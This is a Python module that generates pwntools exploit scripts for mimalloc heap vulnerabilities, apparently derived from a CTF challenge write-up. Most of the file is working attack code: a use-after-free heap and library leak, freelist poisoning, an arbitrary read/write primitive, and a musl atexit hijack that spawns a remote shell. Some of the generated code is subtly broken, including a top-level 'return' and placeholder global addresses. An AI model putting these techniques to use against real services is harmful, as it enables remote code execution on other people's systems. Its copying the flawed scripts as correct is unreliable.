#!/usr/bin/env python3

"""
mimalloc Allocator Exploitation Techniques
Advanced heap exploitation methods for Microsoft's mimalloc allocator
Based on real CTF writeup analysis (doremi challenge)
"""

import struct
import os
import sys
from pathlib import Path

class MimallocExploitationTechniques:
    """Advanced mimalloc allocator exploitation techniques"""
    
    def __init__(self):
        self.mimalloc_techniques = {
            "freelist_manipulation": self.mimalloc_freelist_manipulation,
            "local_free_migration": self.local_free_to_free_migration,
            "arbitrary_read_write": self.arbitrary_read_write_primitive,
            "exit_handler_hijack": self.musl_exit_handler_hijacking
        }
        
        # mimalloc constants
        self.CHUNK_SIZE = 0x80  # 128 bytes
        self.CHUNKS_PER_PAGE = 32  # 0x1000 / 0x80
        self.MI_PAGES_DIRECT = 16
        self.COUNT = 32  # atexit function count
        
        # Common offsets (may need adjustment per environment)
        self.MIMALLOC_TO_MUSL_OFFSET = 0x33000
        
        print("[+] mimalloc Exploitation Techniques initialized")
    
    def detect_mimalloc_challenge(self, binary_path):
        """Detect if challenge uses mimalloc allocator"""
        try:
            with open(binary_path, 'rb') as f:
                content = f.read()
            
            mimalloc_indicators = [
                b"mimalloc", b"mi_", b"libmimalloc",
                b"mi_heap", b"mi_page", b"mi_block",
                b"local_free", b"free_is_zero",
                b"mi_subproc_default", b"LD_PRELOAD"
            ]
            
            detected_indicators = []
            for indicator in mimalloc_indicators:
                if indicator in content:
                    detected_indicators.append(indicator.decode('utf-8', errors='ignore'))
            
            if len(detected_indicators) >= 3:
                print(f"[+] mimalloc challenge detected with indicators: {detected_indicators}")
                return True
            
            return False
            
        except Exception as e:
            print(f"[-] Error detecting mimalloc challenge: {e}")
            return False
    
    def mimalloc_freelist_manipulation(self, target_host, target_port):
        """
        mimalloc Freelist Manipulation Exploit
        Exploits the free vs local_free mechanism in mimalloc
        """
        print("[+] Crafting mimalloc freelist manipulation exploit...")
        
        exploit_code = f"""
#!/usr/bin/env python3

from pwn import *

# Connection setup
if args.REMOTE:
    io = remote('{target_host}', {target_port})
else:
    io = process('./chal')

def create_note(index):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(index).encode())
    io.sendlineafter(b'Content: ', b'A' * 10)

def delete_note(index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(index).encode())

def read_note(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(index).encode())
    io.recvuntil(b'Content: ')
    return io.recvline().strip()

def write_note(index, content):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index: ', str(index).encode())
    io.sendlineafter(b'Content? (127 max): ', content)

print("[+] Starting mimalloc freelist manipulation...")

# Phase 1: Create and free initial chunks to setup freelist
print("[+] Creating and freeing initial chunks...")
create_note(0)
create_note(1)
delete_note(0)
delete_note(1)

# Phase 2: Get heap leak from freed chunk
print("[+] Getting heap leak...")
heap_leak_data = read_note(1)
heap_leak = u64(heap_leak_data[:8].ljust(8, b'\\x00'))
heap_base = heap_leak & 0xFFFFFFFFFFFFF000  # Align to page boundary
print(f"[+] Heap leak: 0x{{heap_leak:x}}")
print(f"[+] Heap base: 0x{{heap_base:x}}")

# Phase 3: Write target address to freelist
print("[+] Writing target address to freelist...")
target_addr = heap_base  # Target the beginning of heap page
write_note(1, p64(target_addr))

# Phase 4: Trigger local_free to free migration
print("[+] Triggering local_free to free migration...")
# Create {self.CHUNKS_PER_PAGE} total chunks to trigger migration
for i in range(2, {self.CHUNKS_PER_PAGE}):
    create_note(i)

# Phase 5: Allocate target chunks
print("[+] Allocating target chunks...")
create_note({self.CHUNKS_PER_PAGE})      # This will be at note 1's location
create_note({self.CHUNKS_PER_PAGE + 1})  # This will be at our target address

# Phase 6: Read from controlled location
print("[+] Reading from controlled location...")
leak_data = read_note({self.CHUNKS_PER_PAGE + 1})
print(f"[+] Leak data: {{leak_data.hex()}}")

# Extract mimalloc library leak
if len(leak_data) >= 8:
    mi_subproc_leak = u64(leak_data[40:48].ljust(8, b'\\x00'))  # Offset to mi_subproc_default
    mimalloc_base = mi_subproc_leak - 0x54d40  # Adjust offset as needed
    musl_base = mimalloc_base - {self.MIMALLOC_TO_MUSL_OFFSET}
    
    print(f"[+] mi_subproc_default leak: 0x{{mi_subproc_leak:x}}")
    print(f"[+] mimalloc base: 0x{{mimalloc_base:x}}")
    print(f"[+] musl base: 0x{{musl_base:x}}")
    
    return {{
        "heap_base": heap_base,
        "mimalloc_base": mimalloc_base,
        "musl_base": musl_base,
        "io": io
    }}

io.interactive()
"""
        
        return exploit_code
    
    def local_free_to_free_migration(self):
        """
        Explain and demonstrate local_free to free migration in mimalloc
        """
        print("[+] Explaining local_free to free migration...")
        
        explanation = """
        mimalloc Local_Free to Free Migration Mechanism:
        
        1. mimalloc uses two freelists per page:
           - local_free: Thread-local deferred free blocks
           - free: Main freelist used for allocation
        
        2. When malloc is called and free is empty:
           - _mi_page_free_collect() is called
           - local_free is moved to free
           - local_free is set to NULL
        
        3. Exploitation technique:
           - Free chunks go to local_free initially
           - Write controlled data to freed chunks in local_free
           - Trigger migration by allocating until free is empty
           - Controlled data becomes part of free freelist
           - Next allocations return controlled addresses
        
        Code flow:
        ```c
        void _mi_page_free_collect(mi_page_t* page, bool force) {
            if mi_likely(page->free == NULL) {
                // usual case - migration happens here
                page->free = page->local_free;
                page->local_free = NULL;
                page->free_is_zero = false;
            }
        }
        ```
        
        Exploitation steps:
        1. Create and free chunks (they go to local_free)
        2. Write target address to freed chunk
        3. Allocate enough chunks to empty free list
        4. Migration moves local_free (with our data) to free
        5. Next allocation returns our controlled address
        """
        
        return explanation
    
    def arbitrary_read_write_primitive(self, target_addr, write_data=None):
        """
        Build arbitrary read/write primitive using mimalloc freelist manipulation
        """
        print(f"[+] Building arbitrary read/write primitive for address 0x{target_addr:x}")
        
        arb_rw_code = f"""
def arbitrary_read_write(io, heap_base, target_addr, write_data=None):
    '''
    Arbitrary read/write primitive using mimalloc freelist manipulation
    '''
    print(f"[+] Setting up arbitrary access to 0x{{target_addr:x}}")
    
    # Setup: Create and free chunks for freelist manipulation
    create_note(100)
    create_note(101)
    delete_note(100)
    delete_note(101)
    
    # Write target address to freelist
    write_note(101, p64(target_addr))
    
    # Trigger migration (create enough chunks to empty free list)
    for i in range(102, 134):  # 32 total chunks
        create_note(i)
    
    # Allocate at target address
    create_note(134)  # This will be at note 101's location
    create_note(135)  # This will be at target_addr
    
    if write_data:
        # Arbitrary write
        print(f"[+] Writing {{len(write_data)}} bytes to 0x{{target_addr:x}}")
        write_note(135, write_data)
        return True
    else:
        # Arbitrary read
        print(f"[+] Reading from 0x{{target_addr:x}}")
        data = read_note(135)
        return data

# Example usage:
# data = arbitrary_read_write(io, heap_base, 0x7fff12345678)  # Read
# arbitrary_read_write(io, heap_base, 0x7fff12345678, b"payload")  # Write
"""
        
        return arb_rw_code
    
    def musl_exit_handler_hijacking(self, system_addr, binsh_addr):
        """
        musl atexit Handler Hijacking Technique
        Exploits musl's atexit mechanism for code execution
        """
        print("[+] Crafting musl atexit handler hijacking exploit...")
        
        exit_hijack_code = f"""
def exploit_musl_exit_handlers(io, musl_base):
    '''
    Exploit musl atexit handlers for shell execution
    '''
    print("[+] Exploiting musl atexit handlers...")
    
    # Calculate addresses
    system_addr = musl_base + 0x54d70  # Adjust offset as needed
    binsh_addr = musl_base + 0x8d698   # Adjust offset as needed
    
    # Find atexit structures in musl
    # struct fl {{ struct fl *next; void (*f[COUNT])(void *); void *a[COUNT]; }}
    head_addr = musl_base + 0x12345  # Address of head global variable
    slot_addr = musl_base + 0x12346  # Address of slot global variable
    
    print(f"[+] system address: 0x{{system_addr:x}}")
    print(f"[+] /bin/sh address: 0x{{binsh_addr:x}}")
    print(f"[+] head address: 0x{{head_addr:x}}")
    print(f"[+] slot address: 0x{{slot_addr:x}}")
    
    # Phase 1: Create fake atexit structure
    print("[+] Creating fake atexit structure...")
    
    # Create 5 contiguous chunks for fake struct fl
    for i in range(200, 205):
        create_note(i)
    
    # Chunk 200: Will contain address of chunk 201 (fake struct fl)
    # Chunks 201-203: Fake struct fl (520 bytes total, spans 3 chunks)
    # Chunk 204: Contains "/bin/sh" string
    
    # Write "/bin/sh" to chunk 204
    write_note(204, b"/bin/sh\\x00")
    
    # Build fake struct fl in chunks 201-203
    fake_fl = b""
    fake_fl += p64(0)  # next = NULL
    
    # f array - function pointers
    fake_fl += p64(system_addr)  # f[0] = system
    fake_fl += p64(0) * ({self.COUNT} - 1)  # Fill rest with NULL
    
    # a array - arguments  
    fake_fl += p64(binsh_addr)  # a[0] = "/bin/sh"
    fake_fl += p64(0) * ({self.COUNT} - 1)  # Fill rest with NULL
    
    # Write fake struct fl across multiple chunks
    chunk_size = 0x80
    for i, chunk_idx in enumerate([201, 202, 203]):
        start = i * chunk_size
        end = min(start + chunk_size, len(fake_fl))
        if start < len(fake_fl):
            chunk_data = fake_fl[start:end].ljust(chunk_size, b'\\x00')
            write_note(chunk_idx, chunk_data[:127])  # Max 127 bytes per write
    
    # Phase 2: Overwrite head pointer
    print("[+] Overwriting head pointer...")
    
    # Use arbitrary write to overwrite head global variable
    chunk_201_addr = heap_base + (201 * 0x80)  # Calculate chunk 201 address
    arbitrary_read_write(io, heap_base, head_addr, p64(chunk_201_addr))
    
    # Phase 3: Set slot to 1
    print("[+] Setting slot to 1...")
    arbitrary_read_write(io, heap_base, slot_addr, p64(1))
    
    # Phase 4: Trigger exit
    print("[+] Triggering exit to execute shell...")
    io.sendlineafter(b'> ', b'999')  # Send invalid option to trigger exit
    
    print("[+] Shell should be spawned!")
    return True

# Usage in main exploit:
# exploit_musl_exit_handlers(io, musl_base)
"""
        
        return exit_hijack_code
    
    def generate_complete_mimalloc_exploit(self, target_host="localhost", target_port=1337):
        """Generate complete mimalloc exploitation script"""
        print("[+] Generating complete mimalloc exploitation script...")
        
        complete_exploit = f"""#!/usr/bin/env python3

'''
Complete mimalloc Exploitation Script
Combines freelist manipulation with musl atexit handler hijacking
Based on doremi challenge writeup analysis
'''

from pwn import *

# Configuration
TARGET_HOST = "{target_host}"
TARGET_PORT = {target_port}
CHUNK_SIZE = 0x{self.CHUNK_SIZE:x}
CHUNKS_PER_PAGE = {self.CHUNKS_PER_PAGE}
MIMALLOC_TO_MUSL_OFFSET = 0x{self.MIMALLOC_TO_MUSL_OFFSET:x}

# Connection setup
if args.REMOTE:
    io = remote(TARGET_HOST, TARGET_PORT)
else:
    io = process('./chal')

def create_note(index):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(index).encode())
    io.sendlineafter(b'Content: ', b'A' * 10)

def delete_note(index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(index).encode())

def read_note(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(index).encode())
    io.recvuntil(b'Content: ')
    return io.recvline().strip()

def write_note(index, content):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index: ', str(index).encode())
    io.sendlineafter(b'Content? (127 max): ', content)

{self.arbitrary_read_write_primitive(0x0)}

{self.musl_exit_handler_hijacking(0x0, 0x0)}

def main():
    print("[+] Starting complete mimalloc exploitation...")
    
    # Phase 1: Get heap and library leaks
    print("[+] Phase 1: Getting memory leaks...")
    
    # Create and free initial chunks
    create_note(0)
    create_note(1)
    delete_note(0)
    delete_note(1)
    
    # Get heap leak
    heap_leak_data = read_note(1)
    heap_leak = u64(heap_leak_data[:8].ljust(8, b'\\x00'))
    heap_base = heap_leak & 0xFFFFFFFFFFFFF000
    print(f"[+] Heap base: 0x{{heap_base:x}}")
    
    # Setup for library leak
    write_note(1, p64(heap_base))
    
    # Trigger local_free to free migration
    for i in range(2, CHUNKS_PER_PAGE):
        create_note(i)
    
    # Allocate at heap base to get library leak
    create_note(CHUNKS_PER_PAGE)
    create_note(CHUNKS_PER_PAGE + 1)
    
    leak_data = read_note(CHUNKS_PER_PAGE + 1)
    if len(leak_data) >= 48:
        mi_subproc_leak = u64(leak_data[40:48].ljust(8, b'\\x00'))
        mimalloc_base = mi_subproc_leak - 0x54d40
        musl_base = mimalloc_base - MIMALLOC_TO_MUSL_OFFSET
        
        print(f"[+] mimalloc base: 0x{{mimalloc_base:x}}")
        print(f"[+] musl base: 0x{{musl_base:x}}")
    else:
        print("[-] Failed to get library leak")
        return
    
    # Phase 2: Exploit musl atexit handlers
    print("[+] Phase 2: Exploiting musl atexit handlers...")
    exploit_musl_exit_handlers(io, musl_base)
    
    # Phase 3: Get shell
    print("[+] Phase 3: Getting shell...")
    io.interactive()

if __name__ == "__main__":
    main()
"""
        
        return complete_exploit
    
    def analyze_mimalloc_structures(self):
        """Analyze mimalloc internal structures for exploitation"""
        print("[+] Analyzing mimalloc internal structures...")
        
        structures_info = {
            "mi_heap_t": {
                "description": "Main heap structure containing page queues",
                "key_fields": [
                    "pages_free_direct[MI_PAGES_DIRECT]",
                    "pages[MI_BIN_FULL + 1]"
                ],
                "exploitation_notes": "Contains pointers to mi_page_t structures"
            },
            "mi_page_t": {
                "description": "Page structure containing freelists",
                "key_fields": [
                    "free - main freelist for allocations",
                    "local_free - thread-local deferred free blocks"
                ],
                "exploitation_notes": "Key target for freelist manipulation"
            },
            "mi_block_t": {
                "description": "Free block structure in freelists",
                "key_fields": [
                    "next - pointer to next free block"
                ],
                "exploitation_notes": "Can be overwritten via UAF to control allocation"
            },
            "struct fl (musl atexit)": {
                "description": "musl atexit handler structure",
                "key_fields": [
                    "next - pointer to next handler struct",
                    "f[COUNT] - array of function pointers",
                    "a[COUNT] - array of arguments"
                ],
                "exploitation_notes": "Target for exit handler hijacking"
            }
        }
        
        return structures_info
    
    def get_mimalloc_exploitation_strategy(self, challenge_type="heap_notes"):
        """Get recommended mimalloc exploitation strategy"""
        strategies = []
        
        if challenge_type == "heap_notes":
            strategies.append({
                "technique": "Freelist Manipulation",
                "priority": "high",
                "description": "Exploit local_free to free migration for arbitrary allocation",
                "steps": [
                    "Create and free chunks to populate local_free",
                    "Write target address to freed chunk",
                    "Trigger migration by allocating until free is empty",
                    "Allocate at controlled address"
                ]
            })
            
            strategies.append({
                "technique": "musl atexit Handler Hijacking",
                "priority": "high", 
                "description": "Hijack musl exit handlers for code execution",
                "steps": [
                    "Create fake struct fl with system() and '/bin/sh'",
                    "Overwrite head global variable",
                    "Set slot to 1",
                    "Trigger exit for shell execution"
                ]
            })
        
        return strategies

def main():
    """Test mimalloc exploitation techniques"""
    print("mimalloc Exploitation Techniques Test")
    print("=" * 50)
    
    mimalloc_exploiter = MimallocExploitationTechniques()
    
    # Test detection
    test_binary = "test_mimalloc_challenge"
    if mimalloc_exploiter.detect_mimalloc_challenge(test_binary):
        print("[+] mimalloc challenge detected")
        
        # Get exploitation strategies
        strategies = mimalloc_exploiter.get_mimalloc_exploitation_strategy()
        
        print("\n[+] Recommended exploitation strategies:")
        for i, strategy in enumerate(strategies, 1):
            print(f"{i}. {strategy['technique']} (Priority: {strategy['priority']})")
            print(f"   Description: {strategy['description']}")
            print(f"   Steps: {', '.join(strategy['steps'])}")
        
        # Generate freelist manipulation exploit
        print("\n[+] Generating freelist manipulation exploit...")
        freelist_exploit = mimalloc_exploiter.mimalloc_freelist_manipulation("localhost", 1337)
        print("[+] Freelist manipulation exploit generated")
        
        # Generate complete exploit
        print("\n[+] Generating complete exploitation script...")
        complete_exploit = mimalloc_exploiter.generate_complete_mimalloc_exploit()
        print("[+] Complete exploitation script generated")
        
        # Analyze structures
        print("\n[+] Analyzing mimalloc structures...")
        structures = mimalloc_exploiter.analyze_mimalloc_structures()
        for name, info in structures.items():
            print(f"[+] {name}: {info['description']}")
    
    else:
        print("[-] No mimalloc challenge detected")
    
    print("\n[+] mimalloc exploitation techniques test completed!")

if __name__ == "__main__":
    main()